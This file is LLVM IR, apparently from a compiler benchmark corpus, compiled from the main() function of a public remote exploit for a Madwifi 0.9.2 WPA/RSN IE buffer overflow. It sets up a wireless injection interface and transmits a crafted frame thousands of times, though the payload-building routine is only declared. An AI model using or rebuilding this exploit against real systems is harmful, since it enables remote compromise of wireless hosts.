; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_3389.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_3389.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.tx80211 = type { i8* }
%struct.tx80211_packet = type { i8*, i32 }

@iface = common dso_local global i8* null, align 8
@driver = common dso_local global i8* null, align 8
@ip = common dso_local global i8* null, align 8
@port = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [268 x i8] c"\0A\0AMadwifi 0.9.2 WPA/RSN IE buffer overflow\0A\09 exploit code: sgrakkyu <at> antifork.org\0A-------------------- **** ------------------\0A[opt-ip]: %s\0A[opt-port]: %d\0A[opt-iface]: %s\0A[opt-driver]: %s\0A[opt-jump]: 0x%08x\0A[pad]: %d\0A-------------------- **** ------------------\0A\0A\00", align 1
@jmp_address = common dso_local global i32 0, align 4
@pad_space = common dso_local global i32 0, align 4
@TOTAL_PACKET_LEN = common dso_local global i32 0, align 4
@INJ_NODRIVER = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [29 x i8] c"Driver name not recognized.\0A\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"Error initializing drive \22%s\22.\0A\00", align 1
@TX80211_CAP_CTRL = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [54 x i8] c"Driver does not support transmitting control frames.\0A\00", align 1
@CHANNEL = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [24 x i8] c"Error setting channel.\0A\00", align 1
@.str.5 = private unnamed_addr constant [30 x i8] c"Unable to open interface %s.\0A\00", align 1
@.str.6 = private unnamed_addr constant [38 x i8] c"[sending packets]: about 10 a second\0A\00", align 1
@.str.7 = private unnamed_addr constant [28 x i8] c"Unable to transmit packet.\0A\00", align 1
@.str.8 = private unnamed_addr constant [9 x i8] c"txpacket\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.tx80211, align 8
  %8 = alloca %struct.tx80211_packet, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  %11 = load i32, i32* %4, align 4
  %12 = load i8**, i8*** %5, align 8
  %13 = call i32 @parse_arg(i32 %11, i8** %12)
  %14 = load i8*, i8** @iface, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %25

16:                                               ; preds = %2
  %17 = load i8*, i8** @driver, align 8
  %18 = icmp ne i8* %17, null
  br i1 %18, label %19, label %25

19:                                               ; preds = %16
  %20 = load i8*, i8** @ip, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %25

22:                                               ; preds = %19
  %23 = load i32, i32* @port, align 4
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %31, label %25

25:                                               ; preds = %22, %19, %16, %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @usage(i8* %28)
  %30 = call i32 @exit(i32 1) #3
  unreachable

31:                                               ; preds = %22
  %32 = load i8*, i8** @ip, align 8
  %33 = load i32, i32* @port, align 4
  %34 = load i8*, i8** @iface, align 8
  %35 = load i8*, i8** @driver, align 8
  %36 = load i32, i32* @jmp_address, align 4
  %37 = load i32, i32* @pad_space, align 4
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([268 x i8], [268 x i8]* @.str, i64 0, i64 0), i8* %32, i32 %33, i8* %34, i8* %35, i32 %36, i32 %37)
  %39 = call i8* (...) @build_frame()
  store i8* %39, i8** %10, align 8
  %40 = load i8*, i8** %10, align 8
  %41 = load i32, i32* @TOTAL_PACKET_LEN, align 4
  %42 = call i32 @print_frame(i8* %40, i32 %41)
  %43 = load i8*, i8** @driver, align 8
  %44 = call i32 @tx80211_resolvecard(i8* %43)
  store i32 %44, i32* %9, align 4
  %45 = load i32, i32* %9, align 4
  %46 = load i32, i32* @INJ_NODRIVER, align 4
  %47 = icmp eq i32 %45, %46
  br i1 %47, label %48, label %51

48:                                               ; preds = %31
  %49 = load i32, i32* @stderr, align 4
  %50 = call i32 (i32, i8*, ...) @fprintf(i32 %49, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %107

51:                                               ; preds = %31
  %52 = load i8*, i8** @iface, align 8
  %53 = load i32, i32* %9, align 4
  %54 = call i64 @tx80211_init(%struct.tx80211* %7, i8* %52, i32 %53)
  %55 = icmp slt i64 %54, 0
  br i1 %55, label %56, label %62

56:                                               ; preds = %51
  %57 = load i32, i32* @stderr, align 4
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 1
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 (i32, i8*, ...) @fprintf(i32 %57, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i8* %60)
  store i32 -1, i32* %3, align 4
  br label %107

62:                                               ; preds = %51
  %63 = call i32 @tx80211_getcapabilities(%struct.tx80211* %7)
  %64 = load i32, i32* @TX80211_CAP_CTRL, align 4
  %65 = and i32 %63, %64
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %67, label %70

67:                                               ; preds = %62
  %68 = load i32, i32* @stderr, align 4
  %69 = call i32 (i32, i8*, ...) @fprintf(i32 %68, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %107

70:                                               ; preds = %62
  %71 = load i32, i32* @CHANNEL, align 4
  %72 = call i64 @tx80211_setchannel(%struct.tx80211* %7, i32 %71)
  %73 = icmp slt i64 %72, 0
  br i1 %73, label %74, label %77

74:                                               ; preds = %70
  %75 = load i32, i32* @stderr, align 4
  %76 = call i32 (i32, i8*, ...) @fprintf(i32 %75, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %107

77:                                               ; preds = %70
  %78 = call i64 @tx80211_open(%struct.tx80211* %7)
  %79 = icmp slt i64 %78, 0
  br i1 %79, label %80, label %85

80:                                               ; preds = %77
  %81 = load i32, i32* @stderr, align 4
  %82 = getelementptr inbounds %struct.tx80211, %struct.tx80211* %7, i32 0, i32 0
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 (i32, i8*, ...) @fprintf(i32 %81, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.5, i64 0, i64 0), i8* %83)
  store i32 1, i32* %3, align 4
  br label %107

85:                                               ; preds = %77
  %86 = load i8*, i8** %10, align 8
  %87 = getelementptr inbounds %struct.tx80211_packet, %struct.tx80211_packet* %8, i32 0, i32 0
  store i8* %86, i8** %87, align 8
  %88 = load i32, i32* @TOTAL_PACKET_LEN, align 4
  %89 = getelementptr inbounds %struct.tx80211_packet, %struct.tx80211_packet* %8, i32 0, i32 1
  store i32 %88, i32* %89, align 8
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.6, i64 0, i64 0))
  br label %91

91:                                               ; preds = %101, %85
  %92 = load i32, i32* %6, align 4
  %93 = icmp slt i32 %92, 10000
  br i1 %93, label %94, label %105

94:                                               ; preds = %91
  %95 = call i64 @tx80211_txpacket(%struct.tx80211* %7, %struct.tx80211_packet* %8)
  %96 = icmp slt i64 %95, 0
  br i1 %96, label %97, label %101

97:                                               ; preds = %94
  %98 = load i32, i32* @stderr, align 4
  %99 = call i32 (i32, i8*, ...) @fprintf(i32 %98, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.7, i64 0, i64 0))
  %100 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.8, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %107

101:                                              ; preds = %94
  %102 = load i32, i32* %6, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %6, align 4
  %104 = call i32 @usleep(i32 100000)
  br label %91

105:                                              ; preds = %91
  %106 = call i32 @tx80211_close(%struct.tx80211* %7)
  store i32 0, i32* %3, align 4
  br label %107

107:                                              ; preds = %105, %97, %80, %74, %67, %56, %48
  %108 = load i32, i32* %3, align 4
  ret i32 %108
}

declare dso_local i32 @parse_arg(i32, i8**) #1

declare dso_local i32 @usage(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @build_frame(...) #1

declare dso_local i32 @print_frame(i8*, i32) #1

declare dso_local i32 @tx80211_resolvecard(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i64 @tx80211_init(%struct.tx80211*, i8*, i32) #1

declare dso_local i32 @tx80211_getcapabilities(%struct.tx80211*) #1

declare dso_local i64 @tx80211_setchannel(%struct.tx80211*, i32) #1

declare dso_local i64 @tx80211_open(%struct.tx80211*) #1

declare dso_local i64 @tx80211_txpacket(%struct.tx80211*, %struct.tx80211_packet*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @tx80211_close(%struct.tx80211*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
